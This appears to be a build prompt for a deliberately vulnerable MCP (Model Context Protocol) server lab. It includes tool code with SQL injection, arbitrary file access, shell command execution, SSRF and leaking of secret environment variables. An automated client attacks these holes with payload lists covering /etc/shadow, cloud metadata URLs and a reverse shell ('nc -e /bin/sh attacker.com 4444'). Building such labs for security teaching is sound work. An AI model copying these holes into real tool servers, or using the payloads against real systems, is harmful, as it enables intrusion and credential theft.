
## MCP Vulnerability Demonstration System Implementation Prompt

**Task**: Build a comprehensive MCP (Model Context Protocol) vulnerability demonstration system with dual transport mechanisms, extensive vulnerable tools, and automated attack clients for educational security research.

### Core Vulnerable Servers

**1. STDIO Transport Server**
```python
from mcp.server.fastmcp import FastMCP
import sqlite3, os, subprocess, requests, hashlib, random, string

mcp = FastMCP("Vulnerable MCP Server")

# SQL Injection Vulnerabilities
@mcp.tool()
def insert_record(name: str, address: str) -> str:
    conn = sqlite3.connect("vulnerable_mcp.db")
    cursor = conn.cursor()
    cursor.execute(f"INSERT INTO records (name, address) VALUES ('{name}', '{address}')")
    conn.commit()
    conn.close()
    return f"Record inserted: {name}, {address}"

@mcp.tool()
def execute_sql(query: str) -> str:
    conn = sqlite3.connect("vulnerable_mcp.db")
    cursor = conn.cursor()
    result = cursor.execute(query).fetchall()
    conn.close()
    return str(result)

# Environment Variable Exposure
@mcp.tool()
def get_env_variable(var_name: str) -> str:
    return os.getenv(var_name, "Variable not found")

# File System Vulnerabilities
@mcp.tool()
def read_file(file_path: str) -> str:
    with open(file_path, 'r') as f:
        return f.read()

@mcp.tool()
def write_file(file_path: str, content: str) -> str:
    with open(file_path, 'w') as f:
        f.write(content)
    return f"Content written to {file_path}"

# Command Execution Vulnerabilities
@mcp.tool()
def execute_command(command: str) -> str:
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return f"Output: {result.stdout}\nError: {result.stderr}"

@mcp.tool()
def kill_process(pid: str) -> str:
    os.kill(int(pid), 9)
    return f"Process {pid} terminated"

# Network Vulnerabilities (SSRF)
@mcp.tool()
def make_request(url: str, method: str = "GET", data: str = "") -> str:
    response = requests.request(method, url, data=data)
    return f"Status: {response.status_code}\nContent: {response.text[:500]}"

@mcp.tool()
def scan_port(host: str, port: int) -> str:
    import socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((host, port))
    sock.close()
    return "Open" if result == 0 else "Closed"

# Cryptographic Weaknesses
@mcp.tool()
def generate_hash(data: str, algorithm: str = "md5") -> str:
    hasher = getattr(hashlib, algorithm)()
    hasher.update(data.encode())
    return hasher.hexdigest()

@mcp.tool()
def generate_token(length: int = 8) -> str:
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

# Database Connection Vulnerabilities
@mcp.tool()
def connect_database(connection_string: str, query: str) -> str:
    conn = sqlite3.connect(connection_string)
    cursor = conn.cursor()
    result = cursor.execute(query).fetchall()
    conn.close()
    return str(result)

if __name__ == "__main__":
    mcp.run(transport='stdio')
```

**2. SSE Transport Server with Attack Endpoint**
```python
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
from mcp.server.fastmcp import FastMCP
import sqlite3, os

app = FastAPI()
mcp = FastMCP("Vulnerable SSE MCP Server")

@app.post("/attack")
async def attack_endpoint(request: Request):
    data = await request.json()
    attack_type = data.get("attack_type")
    
    if attack_type == "sqli":
        payload = data.get("payload", {})
        conn = sqlite3.connect("vulnerable_mcp_sse.db")
        cursor = conn.cursor()
        cursor.executescript(f"INSERT INTO records (name, address) VALUES ('{payload['name']}', '{payload['address']}')")
        conn.commit()
        conn.close()
        return JSONResponse({"sqli": "success"})
    
    elif attack_type == "env":
        var_name = data.get("var_name", "SECRET_KEY")
        value = os.environ.get(var_name, "Not found")
        return JSONResponse({"env_var": var_name, "value": value})
    
    return JSONResponse({"error": "Unknown attack_type"}, status_code=400)

# Include all the same vulnerable tools as STDIO server
app.mount("/sse", create_sse_server(mcp))

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=9000)
```

### Comprehensive Attack Client

**Attack Automation with Success Tracking**
```python
import asyncio
from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

class ComprehensiveAttackClient:
    def __init__(self):
        self.success_metrics = {
            'sql_injection': {'success': 0, 'total': 0},
            'file_access': {'success': 0, 'total': 0},
            'command_execution': {'success': 0, 'total': 0},
            'network_attacks': {'success': 0, 'total': 0},
            'crypto_weaknesses': {'success': 0, 'total': 0},
            'env_exposure': {'success': 0, 'total': 0}
        }

    async def test_sql_injection(self):
        payloads = [
            "test');--", "' OR 1=1 --", "; DROP TABLE records; --",
            "Robert'); DROP TABLE records;--", "' UNION SELECT 1, 'pwned', 'pwned'--"
        ]
        for payload in payloads:
            try:
                result = await self.session.call_tool("insert_record", 
                    {"name": payload, "address": "123 Exploit St"})
                if "Record inserted" in str(result) or "error" not in str(result).lower():
                    self.success_metrics['sql_injection']['success'] += 1
            except Exception:
                pass
        self.success_metrics['sql_injection']['total'] = len(payloads)

    async def test_file_access(self):
        file_payloads = [
            "../../../etc/passwd", "..\\..\\windows\\system32\\config\\sam",
            "/proc/version", "C:\\Windows\\System32\\drivers\\etc\\hosts"
        ]
        for payload in file_payloads:
            try:
                result = await self.session.call_tool("read_file", {"file_path": payload})
                if result and len(str(result)) > 10:
                    self.success_metrics['file_access']['success'] += 1
            except Exception:
                pass
        self.success_metrics['file_access']['total'] = len(file_payloads)

    async def test_command_execution(self):
        cmd_payloads = [
            "ls; cat /etc/passwd", "dir & type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "whoami", "id", "uname -a"
        ]
        for payload in cmd_payloads:
            try:
                result = await self.session.call_tool("execute_command", {"command": payload})
                if result and "Output:" in str(result):
                    self.success_metrics['command_execution']['success'] += 1
            except Exception:
                pass
        self.success_metrics['command_execution']['total'] = len(cmd_payloads)

    async def test_network_attacks(self):
        ssrf_payloads = [
            "http://localhost:22", "http://169.254.169.254/metadata",
            "file:///etc/passwd", "http://internal.service:8080"
        ]
        for payload in ssrf_payloads:
            try:
                result = await self.session.call_tool("make_request", {"url": payload})
                if result and "Status:" in str(result):
                    self.success_metrics['network_attacks']['success'] += 1
            except Exception:
                pass
        self.success_metrics['network_attacks']['total'] = len(ssrf_payloads)

    async def test_crypto_weaknesses(self):
        weak_algos = ["md5", "sha1"]
        for algo in weak_algos:
            try:
                result = await self.session.call_tool("generate_hash", 
                    {"data": "test", "algorithm": algo})
                if result and len(str(result)) > 10:
                    self.success_metrics['crypto_weaknesses']['success'] += 1
            except Exception:
                pass
        self.success_metrics['crypto_weaknesses']['total'] = len(weak_algos)

    def generate_report(self):
        total_success = sum(m['success'] for m in self.success_metrics.values())
        total_tests = sum(m['total'] for m in self.success_metrics.values())
        
        print("\n" + "="*50)
        print(f"COMPREHENSIVE ATTACK REPORT")
        print("="*50)
        print(f"Overall Success Rate: {total_success}/{total_tests} ({100 * total_success / total_tests:.1f}%)")
        
        for category, metrics in self.success_metrics.items():
            if metrics['total'] > 0:
                rate = 100 * metrics['success'] / metrics['total']
                print(f"{category.replace('_', ' ').title()}: {metrics['success']}/{metrics['total']} ({rate:.1f}%)")
        print("="*50)
```

### Attack Payload Collections

**Comprehensive Payload Database**
```python
ATTACK_PAYLOADS = {
    'sql_injection': [
        "test');--", "' OR 1=1 --", "; DROP TABLE records; --",
        "Robert'); DROP TABLE records;--", "' UNION SELECT 1, 'pwned', 'pwned'--",
        "admin' #", "' OR '' = '", "test', 'malicious');--"
    ],
    'path_traversal': [
        "../../../etc/passwd", "..\\..\\windows\\system32\\config\\sam",
        "/proc/version", "../../../../etc/shadow", "..\\..\\..\\boot.ini"
    ],
    'command_injection': [
        "ls; cat /etc/passwd", "dir & type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "whoami && id", "uname -a; ps aux", "nc -e /bin/sh attacker.com 4444"
    ],
    'ssrf_targets': [
        "http://localhost:22", "http://169.254.169.254/metadata",
        "file:///etc/passwd", "http://internal.service:8080", "gopher://127.0.0.1:25"
    ],
    'environment_vars': [
        "SECRET_KEY", "PATH", "USER", "HOME", "TEMP", "AWS_ACCESS_KEY_ID",
        "DATABASE_URL", "API_KEY", "PRIVATE_KEY", "SESSION_SECRET"
    ]
}
```

### Dependencies and Setup

**requirements.txt**
```
mcp
fastapi
uvicorn
sse-starlette
requests
psutil
```

**Usage Instructions**
1. Start STDIO server: `python vuln-mcp.py`
2. Start SSE server: `python mcp-sse-vulnerable-server.py`
3. Run comprehensive attacks: `python comprehensive-attack-client.py vuln-mcp.py`
4. Review detailed vulnerability reports and success metrics

